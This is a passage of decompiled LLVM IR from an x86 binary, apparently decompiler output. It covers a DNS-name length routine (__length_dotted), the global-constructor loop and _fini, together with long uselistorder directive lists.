  uselistorder i32 %v2_805439b, { 0, 2, 1 }
  uselistorder i32 %v4_805438c, { 0, 2, 1 }
  uselistorder i32 %v5_80543f837, { 4, 3, 1, 2, 0 }
  uselistorder i32* %ebp.global-to-local, { 3, 0, 2, 1, 4, 5 }
  uselistorder i8 1, { 1, 10, 13, 2, 12, 8, 6, 0, 4, 5, 9, 3, 11, 7 }
  uselistorder i8 46, { 3, 4, 0, 1, 5, 2 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 8, 9, 10, 11, 12, 13, 14, 16, 2, 3, 17, 18, 20, 0, 1, 15, 4, 5, 6, 19, 7 }
  uselistorder i32* @edi, { 3, 177, 178, 23, 179, 180, 181, 22, 182, 183, 4, 184, 0, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 31, 6, 5, 32, 33, 34, 35, 36, 44, 37, 38, 39, 40, 41, 42, 43, 200, 7, 201, 8, 202, 203, 204, 205, 210, 211, 1, 206, 207, 208, 209, 212, 213, 214, 215, 113, 9, 114, 115, 116, 216, 217, 224, 225, 226, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 101, 102, 103, 104, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 10, 128, 129, 130, 131, 132, 133, 134, 330, 331, 11, 332, 333, 12, 336, 337, 287, 288, 289, 52, 53, 54, 338, 339, 340, 355, 55, 13, 56, 57, 45, 46, 47, 48, 49, 50, 51, 170, 14, 171, 172, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 58, 59, 60, 61, 62, 63, 64, 312, 313, 314, 315, 316, 317, 318, 319, 15, 320, 321, 322, 323, 324, 257, 258, 16, 259, 260, 261, 262, 263, 264, 265, 276, 277, 278, 279, 280, 135, 136, 17, 137, 353, 354, 138, 139, 140, 18, 235, 236, 227, 228, 229, 230, 231, 232, 233, 234, 65, 66, 67, 237, 238, 239, 141, 142, 143, 144, 145, 146, 147, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 19, 162, 28, 29, 30, 148, 20, 149, 150, 349, 350, 351, 352, 240, 241, 242, 243, 244, 245, 163, 164, 165, 166, 218, 219, 220, 221, 222, 223, 334, 335, 173, 174, 285, 286, 68, 69, 70, 290, 291, 346, 347, 348, 71, 21, 72, 73, 74, 75, 292, 293, 76, 77, 78, 341, 342, 343, 344, 345, 79, 80, 81, 84, 82, 83, 85, 86, 87, 88, 89, 90, 91, 92, 93, 2, 94, 95, 96, 97, 98, 99, 100, 105, 106, 107, 108, 109, 110, 111, 112, 167, 168, 169, 24, 25, 26, 27, 175, 176, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 281, 282, 283, 284, 294, 295, 296, 325, 326, 327, 328, 329 }
  uselistorder i32 256, { 1, 2, 3, 4, 5, 49, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 48, 16, 17, 18, 21, 19, 20, 22, 23, 24, 44, 45, 25, 46, 50, 26, 27, 55, 28, 29, 0, 53, 54, 47, 30, 31, 32, 33, 34, 56, 35, 36, 37, 38, 39, 40, 51, 57, 41, 52, 42, 43 }
  uselistorder i8 64, { 0, 2, 6, 7, 3, 8, 4, 5, 1 }
  uselistorder i1 true, { 1, 4, 11, 3, 5, 6, 8, 7, 9, 10, 2, 0 }
  uselistorder i32* @edx, { 8, 163, 164, 165, 166, 167, 168, 169, 22, 3, 173, 171, 172, 2, 174, 175, 176, 177, 178, 179, 180, 181, 50, 54, 51, 52, 53, 182, 183, 184, 185, 186, 187, 188, 194, 189, 190, 191, 192, 193, 4, 23, 105, 114, 115, 116, 117, 118, 119, 120, 195, 196, 207, 197, 5, 211, 212, 213, 214, 225, 9, 6, 24, 106, 121, 122, 198, 199, 10, 200, 201, 202, 123, 124, 125, 126, 127, 128, 308, 309, 310, 311, 11, 312, 313, 231, 232, 57, 55, 233, 317, 318, 325, 324, 315, 88, 12, 89, 90, 91, 92, 93, 94, 95, 56, 236, 237, 13, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 14, 251, 252, 234, 235, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 15, 74, 75, 76, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 16, 290, 291, 292, 293, 294, 295, 296, 320, 77, 215, 216, 218, 1, 170, 217, 87, 129, 203, 204, 205, 78, 206, 130, 131, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 21, 149, 150, 132, 151, 17, 152, 153, 155, 18, 156, 157, 158, 159, 160, 49, 19, 154, 316, 208, 209, 210, 20, 161, 226, 227, 314, 162, 319, 224, 321, 307, 0, 228, 229, 79, 221, 230, 80, 322, 323, 81, 82, 83, 84, 85, 86, 96, 97, 98, 99, 100, 101, 102, 103, 104, 107, 108, 109, 110, 111, 112, 113, 25, 26, 27, 29, 30, 28, 31, 32, 33, 34, 35, 37, 36, 38, 39, 40, 42, 41, 43, 44, 45, 46, 47, 48, 219, 220, 222, 223, 297, 298, 299, 300, 302, 306, 301, 304, 305, 7, 303, 326 }
  uselistorder i32* @esi, { 223, 224, 225, 226, 227, 228, 35, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 36, 51, 52, 10, 7, 58, 53, 54, 55, 56, 57, 249, 11, 250, 251, 255, 252, 253, 254, 262, 256, 257, 258, 259, 260, 261, 263, 264, 265, 266, 267, 268, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 12, 152, 153, 13, 276, 277, 278, 14, 279, 280, 281, 282, 305, 306, 307, 308, 309, 310, 1, 311, 312, 313, 314, 315, 316, 317, 318, 127, 128, 129, 130, 131, 368, 369, 370, 371, 319, 320, 154, 155, 156, 157, 0, 158, 337, 338, 339, 67, 68, 69, 372, 373, 374, 375, 376, 384, 387, 388, 389, 70, 71, 72, 73, 74, 75, 76, 377, 382, 383, 59, 60, 61, 62, 216, 217, 218, 2, 219, 220, 221, 63, 64, 65, 66, 340, 344, 15, 345, 346, 347, 348, 349, 350, 351, 341, 342, 343, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 352, 353, 354, 355, 356, 357, 358, 3, 359, 360, 361, 362, 16, 363, 37, 364, 365, 366, 367, 321, 322, 323, 326, 327, 328, 329, 330, 331, 332, 333, 334, 390, 17, 391, 392, 159, 18, 160, 38, 32, 324, 325, 112, 113, 399, 400, 161, 162, 163, 164, 165, 166, 167, 293, 19, 8, 283, 287, 288, 289, 290, 20, 33, 291, 292, 284, 285, 286, 92, 21, 93, 94, 294, 22, 295, 296, 168, 169, 170, 171, 24, 172, 4, 174, 175, 176, 177, 23, 178, 179, 173, 180, 181, 182, 183, 5, 184, 185, 186, 187, 188, 189, 34, 25, 190, 191, 26, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 27, 209, 210, 211, 28, 50, 192, 6, 193, 194, 378, 379, 380, 381, 393, 394, 395, 396, 397, 398, 297, 298, 299, 300, 29, 301, 302, 303, 304, 212, 213, 214, 215, 269, 270, 271, 272, 273, 30, 31, 274, 275, 385, 386, 335, 336, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 108, 106, 107, 109, 110, 111, 114, 115, 116, 117, 118, 9, 119, 120, 121, 122, 123, 124, 125, 126, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 222, 401 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_8054413, { 1, 0 }
  uselistorder label %dec_label_pc_80543d8, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_805442a = icmp eq i32 %arg1, 0
  br i1 %v1_805442a, label %dec_label_pc_8054459, label %dec_label_pc_805444a.preheader

dec_label_pc_805444a.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_805444a10 = add i32 %arg2, %arg1
  %v3_805444a11 = inttoptr i32 %v2_805444a10 to i8*
  %v4_805444a12 = load i8, i8* %v3_805444a11, align 1
  %v1_805444e14 = add i32 %arg2, 1
  %v1_805445115 = icmp eq i8 %v4_805444a12, 0
  %v1_805445316 = icmp eq i1 %v1_805445115, false
  br i1 %v1_805445316, label %dec_label_pc_8054439, label %dec_label_pc_8054455

dec_label_pc_8054430:                             ; preds = %dec_label_pc_8054439
  %v1_8054430 = add i32 %v0_805443017, 2
  br label %dec_label_pc_8054455

dec_label_pc_8054439:                             ; preds = %dec_label_pc_805444a.preheader, %dec_label_pc_805444a
  %v1_805444e19 = phi i32 [ %v1_805444e, %dec_label_pc_805444a ], [ %v1_805444e14, %dec_label_pc_805444a.preheader ]
  %v5_805444a18.in = phi i8 [ %v4_805444a, %dec_label_pc_805444a ], [ %v4_805444a12, %dec_label_pc_805444a.preheader ]
  %v0_805443017 = phi i32 [ %v2_8054447, %dec_label_pc_805444a ], [ %arg2, %dec_label_pc_805444a.preheader ]
  %v5_805444a18 = zext i8 %v5_805444a18.in to i32
  %v1_805443b = and i32 %v5_805444a18, 192
  %v6_8054440 = icmp eq i32 %v1_805443b, 192
  %v2_8054447 = add i32 %v5_805444a18, %v1_805444e19
  br i1 %v6_8054440, label %dec_label_pc_8054430, label %dec_label_pc_805444a

dec_label_pc_805444a:                             ; preds = %dec_label_pc_8054439
  store i32 %v2_8054447, i32* @ecx, align 4
  %v2_805444a = add i32 %v2_8054447, %arg1
  %v3_805444a = inttoptr i32 %v2_805444a to i8*
  %v4_805444a = load i8, i8* %v3_805444a, align 1
  %v1_805444e = add i32 %v2_8054447, 1
  %v1_8054451 = icmp eq i8 %v4_805444a, 0
  %v1_8054453 = icmp eq i1 %v1_8054451, false
  br i1 %v1_8054453, label %dec_label_pc_8054439, label %dec_label_pc_8054455

dec_label_pc_8054455:                             ; preds = %dec_label_pc_805444a.preheader, %dec_label_pc_805444a, %dec_label_pc_8054430
  %v0_8054455 = phi i32 [ %v1_8054430, %dec_label_pc_8054430 ], [ %v1_805444e14, %dec_label_pc_805444a.preheader ], [ %v1_805444e, %dec_label_pc_805444a ]
  %v2_8054457 = sub i32 %v0_8054455, %arg2
  br label %dec_label_pc_8054459

dec_label_pc_8054459:                             ; preds = %entry, %dec_label_pc_8054455
  %v0_805445c = phi i32 [ -1, %entry ], [ %v2_8054457, %dec_label_pc_8054455 ]
  ret i32 %v0_805445c

; uselistorder directives
  uselistorder i8 %v4_805444a, { 1, 0 }
  uselistorder i32 %v2_8054447, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder i32 2, { 133, 38, 134, 37, 81, 138, 139, 42, 47, 46, 135, 140, 141, 142, 111, 143, 144, 145, 146, 147, 148, 117, 48, 118, 119, 54, 149, 150, 49, 82, 55, 123, 56, 50, 124, 77, 151, 152, 153, 155, 112, 168, 169, 1, 65, 61, 125, 126, 78, 2, 66, 67, 176, 62, 110, 0, 83, 107, 84, 108, 85, 109, 57, 3, 122, 43, 86, 4, 5, 6, 7, 120, 8, 9, 10, 68, 171, 11, 12, 79, 13, 156, 157, 158, 159, 51, 69, 166, 167, 136, 137, 162, 163, 58, 59, 60, 14, 177, 70, 52, 53, 127, 128, 64, 15, 16, 129, 44, 17, 130, 18, 71, 131, 132, 154, 170, 175, 80, 19, 121, 20, 87, 90, 88, 89, 91, 21, 22, 23, 24, 25, 26, 27, 28, 29, 72, 30, 31, 32, 33, 39, 34, 40, 35, 92, 93, 73, 94, 95, 96, 63, 97, 98, 99, 113, 114, 115, 116, 100, 101, 102, 103, 160, 41, 161, 164, 74, 45, 165, 104, 105, 75, 174, 76, 172, 36, 173, 106 }
  uselistorder i8 0, { 40, 5, 8, 9, 41, 7, 6, 137, 138, 11, 145, 140, 141, 10, 143, 144, 142, 36, 146, 2, 3, 62, 63, 147, 148, 38, 150, 12, 14, 84, 83, 13, 42, 151, 152, 153, 95, 96, 17, 161, 157, 158, 156, 15, 159, 160, 16, 37, 162, 163, 173, 174, 175, 176, 177, 188, 189, 19, 86, 85, 18, 87, 88, 167, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 4, 184, 113, 114, 211, 115, 212, 215, 79, 43, 57, 80, 20, 214, 194, 195, 196, 64, 197, 198, 199, 200, 201, 202, 44, 203, 22, 182, 183, 21, 139, 116, 117, 58, 1, 32, 33, 34, 31, 0, 45, 46, 47, 118, 178, 77, 149, 168, 169, 164, 166, 165, 119, 120, 121, 122, 123, 124, 125, 23, 126, 127, 24, 128, 129, 130, 131, 132, 133, 134, 135, 60, 213, 170, 171, 172, 136, 154, 155, 65, 66, 25, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 78, 81, 82, 89, 90, 91, 92, 93, 94, 59, 39, 179, 180, 181, 185, 186, 187, 26, 190, 191, 35, 192, 27, 193, 204, 209, 208, 28, 205, 206, 30, 207, 29, 210, 61, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i32* @ecx, { 27, 6, 8, 26, 7, 120, 123, 15, 124, 125, 126, 127, 16, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 37, 42, 38, 39, 40, 41, 144, 9, 10, 49, 0, 50, 145, 59, 12, 19, 146, 147, 17, 11, 18, 148, 153, 154, 155, 156, 157, 169, 170, 171, 172, 13, 51, 1, 52, 60, 61, 31, 62, 150, 151, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 28, 88, 89, 90, 91, 92, 93, 29, 94, 25, 45, 46, 47, 48, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 20, 198, 173, 174, 175, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 21, 213, 214, 216, 217, 218, 215, 222, 158, 121, 122, 32, 33, 149, 95, 96, 97, 98, 99, 100, 101, 30, 102, 14, 103, 104, 105, 106, 107, 22, 23, 2, 3, 108, 109, 24, 110, 111, 112, 113, 114, 116, 117, 118, 119, 35, 36, 115, 220, 152, 221, 223, 224, 225, 34, 43, 44, 53, 54, 55, 56, 57, 58, 159, 160, 161, 162, 163, 5, 164, 165, 166, 4, 167, 168, 219 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054459, { 1, 0 }
  uselistorder label %dec_label_pc_8054455, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8054439, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805446c = load i32, i32* @global_var_8059128.258, align 8
  %v10_8054471 = icmp eq i32 %v0_805446c, -1
  br i1 %v10_8054471, label %dec_label_pc_8054482, label %dec_label_pc_8054476.preheader

dec_label_pc_8054476.preheader:                   ; preds = %entry
  br label %dec_label_pc_8054476

dec_label_pc_8054476:                             ; preds = %dec_label_pc_8054476.preheader, %dec_label_pc_8054476
  %v4_8054479 = phi i32 [ %v0_805446c, %dec_label_pc_8054476.preheader ], [ %v2_805447b, %dec_label_pc_8054476 ]
  %v0_8054476 = phi i32 [ ptrtoint (i32* @global_var_8059128.258 to i32), %dec_label_pc_8054476.preheader ], [ %v1_8054476, %dec_label_pc_8054476 ]
  %v1_8054476 = add i32 %v0_8054476, -4
  call void @__pseudo_call(i32 %v4_8054479)
  %v1_805447b = inttoptr i32 %v1_8054476 to i32*
  %v2_805447b = load i32, i32* %v1_805447b, align 4
  %v10_805447d = icmp eq i32 %v2_805447b, -1
  %v1_8054480 = icmp eq i1 %v10_805447d, false
  br i1 %v1_8054480, label %dec_label_pc_8054476, label %dec_label_pc_8054482.loopexit

dec_label_pc_8054482.loopexit:                    ; preds = %dec_label_pc_8054476
  %v2_8054482.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8054482

dec_label_pc_8054482:                             ; preds = %dec_label_pc_8054482.loopexit, %entry
  %v2_8054482 = phi i32 [ %v2_8054482.pre, %dec_label_pc_8054482.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_8054482

; uselistorder directives
  uselistorder i32 %v0_805446c, { 1, 0 }
  uselistorder i1 false, {}
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 12, 29, 55, 56, 57, 58, 68, 69, 70, 71, 10, 72, 2, 67, 30, 59, 11, 60, 61, 62, 13, 73, 74, 75, 76, 77, 78, 14, 66, 64, 65, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 7, 5, 6, 8, 3, 63, 0, 42, 43, 44, 9, 16, 45, 46, 47, 1, 48, 49, 50, 51, 52, 15, 4, 53, 54 }
  uselistorder i32 ptrtoint (i32* @global_var_8059128.258 to i32), { 1, 3, 4, 0, 5, 6, 2 }
  uselistorder i32 -1, { 28, 29, 77, 12, 182, 199, 78, 200, 336, 79, 80, 201, 81, 30, 22, 82, 26, 202, 203, 31, 32, 33, 85, 84, 83, 204, 141, 142, 21, 20, 19, 205, 206, 86, 207, 6, 338, 208, 339, 340, 209, 210, 341, 183, 87, 211, 330, 212, 213, 214, 88, 215, 216, 217, 343, 35, 344, 36, 345, 346, 218, 166, 167, 168, 158, 160, 161, 162, 163, 164, 165, 159, 7, 157, 149, 219, 154, 155, 156, 169, 170, 153, 171, 172, 173, 174, 175, 176, 177, 150, 152, 34, 221, 220, 75, 8, 222, 223, 347, 348, 37, 17, 89, 224, 72, 225, 331, 226, 90, 91, 227, 92, 228, 184, 229, 93, 230, 231, 178, 95, 94, 232, 233, 234, 97, 96, 98, 235, 236, 13, 237, 238, 99, 100, 239, 101, 102, 240, 103, 241, 104, 242, 105, 243, 106, 244, 107, 245, 108, 246, 109, 247, 110, 248, 111, 249, 112, 250, 0, 38, 1, 251, 76, 113, 114, 252, 253, 254, 255, 256, 257, 116, 115, 117, 258, 118, 259, 23, 260, 185, 261, 360, 262, 263, 39, 357, 40, 264, 358, 43, 42, 44, 45, 27, 46, 119, 47, 265, 41, 359, 9, 266, 267, 268, 186, 269, 48, 2, 349, 352, 120, 356, 332, 353, 270, 271, 272, 350, 351, 273, 328, 329, 18, 337, 361, 121, 274, 24, 275, 276, 277, 14, 278, 15, 333, 334, 16, 279, 280, 335, 4, 49, 50, 3, 281, 197, 198, 282, 283, 10, 151, 122, 342, 284, 123, 285, 124, 286, 73, 74, 287, 125, 288, 126, 289, 127, 290, 128, 291, 129, 292, 130, 293, 131, 294, 132, 295, 133, 296, 134, 297, 135, 298, 136, 299, 137, 300, 138, 301, 139, 302, 140, 303, 51, 304, 305, 188, 306, 189, 307, 187, 326, 327, 308, 190, 52, 53, 54, 55, 309, 56, 310, 57, 311, 58, 312, 59, 313, 60, 314, 61, 315, 316, 64, 62, 63, 65, 66, 25, 11, 67, 68, 191, 192, 355, 354, 317, 193, 318, 69, 319, 180, 181, 179, 70, 143, 144, 145, 146, 147, 148, 71, 320, 321, 322, 323, 324, 325, 5, 194, 195, 196 }
  uselistorder i32 1, { 429, 852, 241, 723, 853, 235, 854, 118, 855, 272, 856, 857, 99, 431, 430, 142, 228, 273, 274, 858, 243, 861, 391, 862, 863, 864, 242, 865, 255, 413, 15, 14, 866, 867, 433, 432, 181, 868, 434, 869, 435, 182, 870, 871, 436, 183, 184, 749, 750, 751, 752, 753, 754, 755, 756, 757, 440, 439, 438, 414, 437, 415, 165, 164, 163, 166, 758, 759, 442, 441, 416, 417, 93, 95, 94, 96, 98, 97, 319, 872, 873, 229, 318, 874, 875, 275, 876, 353, 877, 879, 443, 131, 0, 1, 883, 880, 881, 882, 244, 444, 92, 91, 884, 445, 121, 788, 789, 790, 276, 791, 885, 886, 887, 446, 189, 188, 185, 186, 187, 355, 888, 145, 277, 278, 110, 111, 109, 112, 279, 447, 22, 320, 256, 449, 448, 23, 24, 450, 190, 451, 87, 356, 452, 230, 892, 893, 237, 894, 280, 245, 246, 895, 896, 236, 897, 898, 899, 900, 901, 281, 455, 454, 453, 917, 918, 919, 920, 921, 922, 923, 924, 234, 257, 925, 282, 926, 927, 928, 283, 929, 930, 284, 931, 932, 933, 934, 935, 357, 426, 457, 456, 27, 29, 28, 321, 322, 978, 979, 980, 981, 247, 792, 793, 794, 458, 21, 459, 802, 460, 119, 120, 323, 902, 418, 191, 354, 803, 804, 805, 285, 358, 806, 461, 807, 286, 808, 809, 473, 472, 471, 470, 469, 468, 467, 466, 465, 464, 463, 462, 192, 201, 198, 195, 199, 193, 197, 194, 196, 200, 967, 968, 2, 55, 54, 53, 52, 51, 474, 202, 203, 475, 32, 33, 810, 811, 476, 84, 83, 85, 1039, 1040, 1041, 11, 12, 10, 812, 477, 170, 173, 174, 175, 172, 171, 813, 324, 480, 479, 478, 481, 72, 482, 483, 25, 485, 484, 73, 487, 486, 71, 488, 204, 489, 205, 490, 206, 491, 207, 492, 67, 494, 493, 149, 495, 130, 497, 496, 138, 498, 502, 501, 500, 499, 133, 1044, 1045, 1046, 504, 503, 140, 139, 325, 506, 505, 509, 508, 507, 208, 510, 326, 402, 722, 258, 516, 515, 514, 513, 512, 511, 210, 209, 1042, 519, 518, 517, 107, 105, 106, 359, 520, 782, 783, 784, 394, 785, 521, 80, 82, 79, 81, 327, 522, 49, 50, 847, 231, 238, 848, 419, 523, 101, 103, 100, 102, 524, 46, 43, 42, 44, 48, 47, 45, 40, 37, 39, 41, 36, 38, 360, 526, 525, 361, 527, 362, 528, 363, 531, 530, 529, 403, 534, 533, 532, 211, 364, 992, 993, 994, 535, 70, 995, 996, 248, 997, 998, 999, 162, 160, 161, 404, 991, 287, 212, 213, 214, 365, 328, 760, 761, 762, 763, 538, 537, 536, 17, 16, 18, 366, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 288, 1009, 1010, 1011, 1012, 1013, 331, 1014, 1015, 227, 332, 1016, 1017, 1018, 1019, 329, 330, 1020, 1021, 1022, 541, 540, 539, 115, 114, 113, 117, 116, 333, 334, 542, 335, 336, 289, 546, 545, 544, 543, 150, 290, 405, 547, 548, 549, 550, 551, 552, 553, 554, 936, 259, 937, 367, 269, 368, 941, 260, 559, 558, 557, 556, 555, 19, 20, 560, 561, 969, 970, 562, 144, 565, 564, 563, 169, 566, 960, 961, 962, 859, 860, 814, 815, 427, 567, 69, 943, 944, 945, 946, 947, 948, 949, 816, 938, 939, 940, 569, 568, 90, 89, 88, 778, 779, 571, 570, 148, 147, 146, 878, 1048, 572, 128, 127, 129, 573, 574, 905, 906, 907, 291, 13, 369, 370, 371, 904, 575, 372, 373, 903, 292, 3, 577, 576, 215, 374, 578, 86, 375, 579, 180, 337, 580, 26, 817, 818, 724, 294, 819, 820, 821, 822, 823, 825, 826, 827, 295, 828, 829, 406, 293, 830, 296, 831, 832, 833, 824, 584, 583, 582, 581, 61, 63, 62, 58, 60, 59, 64, 834, 585, 77, 74, 76, 75, 297, 586, 835, 836, 588, 587, 65, 66, 837, 838, 263, 262, 254, 839, 338, 840, 841, 261, 842, 298, 843, 376, 844, 590, 589, 123, 125, 124, 126, 299, 377, 4, 378, 591, 592, 157, 156, 1043, 594, 593, 216, 217, 339, 1047, 595, 223, 379, 226, 380, 908, 909, 910, 911, 912, 913, 914, 915, 270, 916, 599, 598, 597, 596, 56, 57, 602, 601, 600, 603, 381, 889, 890, 382, 383, 891, 605, 604, 607, 606, 155, 609, 608, 35, 610, 30, 611, 218, 613, 612, 132, 614, 31, 615, 168, 616, 179, 34, 618, 617, 78, 619, 176, 620, 134, 621, 219, 622, 623, 625, 624, 143, 626, 104, 628, 627, 108, 630, 629, 141, 631, 632, 154, 68, 764, 249, 250, 393, 271, 765, 5, 6, 232, 392, 766, 725, 767, 768, 769, 770, 771, 772, 773, 340, 300, 774, 268, 384, 407, 775, 726, 385, 641, 640, 639, 428, 638, 637, 636, 635, 634, 633, 420, 135, 136, 137, 776, 777, 647, 646, 645, 644, 421, 643, 642, 408, 780, 781, 648, 786, 787, 727, 301, 302, 728, 303, 729, 304, 730, 305, 306, 731, 732, 733, 734, 735, 650, 649, 224, 225, 795, 736, 737, 239, 738, 739, 740, 240, 741, 341, 409, 796, 651, 656, 655, 654, 653, 652, 422, 151, 152, 153, 797, 798, 7, 410, 657, 799, 800, 801, 662, 661, 660, 659, 658, 177, 178, 845, 342, 664, 663, 846, 667, 666, 665, 849, 743, 264, 744, 745, 746, 747, 748, 850, 851, 674, 673, 672, 671, 670, 669, 668, 158, 159, 343, 411, 675, 678, 677, 676, 395, 742, 942, 679, 221, 222, 307, 681, 680, 344, 309, 950, 351, 308, 352, 951, 952, 683, 682, 396, 953, 954, 386, 345, 346, 955, 685, 684, 956, 957, 686, 347, 387, 310, 958, 959, 692, 691, 690, 689, 688, 687, 233, 963, 964, 693, 397, 311, 965, 966, 695, 694, 696, 971, 972, 265, 348, 973, 312, 313, 974, 975, 699, 698, 697, 423, 220, 976, 701, 700, 977, 398, 982, 983, 399, 984, 985, 400, 401, 986, 987, 702, 988, 266, 989, 349, 388, 706, 705, 704, 703, 389, 267, 314, 990, 708, 707, 709, 8, 711, 710, 712, 1023, 1024, 1025, 1033, 1034, 253, 1035, 715, 714, 713, 122, 390, 9, 717, 716, 424, 315, 1026, 252, 1027, 1028, 316, 1029, 251, 1031, 1032, 317, 350, 412, 1030, 425, 1036, 1037, 718, 1038, 1049, 167, 720, 719, 721 }
  uselistorder label %dec_label_pc_8054476, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_805448b = load i32, i32* @ebx, align 4
  %v1_805448c = call i32 @__get_pc_thunk_bx(i32 %v0_805448b)
  store i32 %v1_805448c, i32* @eax, align 4
  %v0_8054497 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_8054497

; uselistorder directives
  uselistorder i32* @eax, { 17, 2, 37, 112, 4, 113, 114, 3, 115, 0, 36, 1, 111, 116, 38, 117, 65, 66, 68, 18, 67, 118, 120, 119, 8, 9, 99, 100, 206, 121, 44, 126, 45, 127, 128, 129, 56, 130, 5, 60, 61, 146, 147, 48, 148, 49, 149, 150, 50, 51, 52, 151, 152, 153, 154, 53, 155, 156, 157, 158, 54, 139, 194, 208, 58, 209, 210, 212, 62, 213, 10, 211, 14, 16, 207, 109, 19, 69, 70, 160, 71, 195, 197, 198, 196, 72, 73, 199, 200, 202, 203, 201, 159, 55, 11, 12, 135, 136, 137, 46, 138, 131, 132, 133, 134, 74, 75, 140, 141, 76, 77, 101, 103, 102, 104, 105, 107, 64, 106, 142, 143, 57, 144, 145, 122, 39, 40, 123, 41, 124, 42, 43, 125, 20, 78, 79, 80, 81, 82, 21, 83, 22, 24, 23, 26, 25, 27, 84, 28, 29, 85, 86, 87, 47, 88, 59, 89, 30, 90, 31, 32, 91, 92, 93, 94, 95, 96, 97, 33, 98, 108, 34, 7, 6, 35, 63, 110, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 189, 186, 187, 188, 190, 191, 192, 193, 214, 204, 205, 13, 15 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 1051, 14, 15, 16, 64, 662, 1052, 1055, 1053, 1054, 663, 919, 920, 17, 66, 1058, 1066, 1060, 1061, 18, 55, 1062, 1063, 1064, 664, 1065, 65, 129, 130, 131, 1056, 1057, 139, 1067, 1068, 1070, 1071, 1069, 1072, 283, 1073, 1074, 1075, 1076, 1077, 1078, 140, 141, 665, 362, 363, 110, 780, 666, 781, 782, 69, 70, 783, 784, 785, 638, 786, 68, 667, 67, 668, 142, 0, 1, 669, 143, 144, 670, 671, 672, 145, 673, 1081, 674, 1079, 268, 1080, 364, 365, 146, 2, 3, 675, 1082, 1083, 1084, 1085, 1086, 366, 676, 677, 147, 1087, 19, 71, 892, 113, 114, 678, 1088, 72, 679, 20, 148, 921, 367, 1089, 1090, 1091, 922, 923, 13, 284, 150, 149, 924, 925, 285, 926, 927, 151, 152, 680, 1092, 1093, 681, 928, 682, 929, 930, 931, 932, 1094, 153, 683, 154, 368, 1097, 1098, 1099, 1100, 120, 21, 1101, 73, 1114, 1115, 1128, 1129, 1130, 1131, 1137, 1138, 1139, 1140, 1132, 1133, 1134, 1135, 1136, 74, 75, 684, 1141, 1142, 76, 77, 78, 685, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 155, 1218, 1219, 156, 1220, 1221, 1222, 79, 121, 286, 132, 686, 122, 933, 157, 934, 22, 123, 115, 935, 254, 158, 936, 116, 937, 1102, 1103, 1110, 287, 1111, 687, 938, 369, 939, 940, 941, 942, 943, 944, 945, 946, 159, 688, 947, 948, 949, 950, 160, 951, 689, 161, 249, 370, 162, 690, 691, 692, 288, 952, 1202, 1203, 1204, 289, 278, 279, 1205, 1206, 1207, 1208, 1209, 1210, 693, 290, 953, 163, 694, 954, 164, 291, 292, 955, 956, 695, 957, 958, 959, 960, 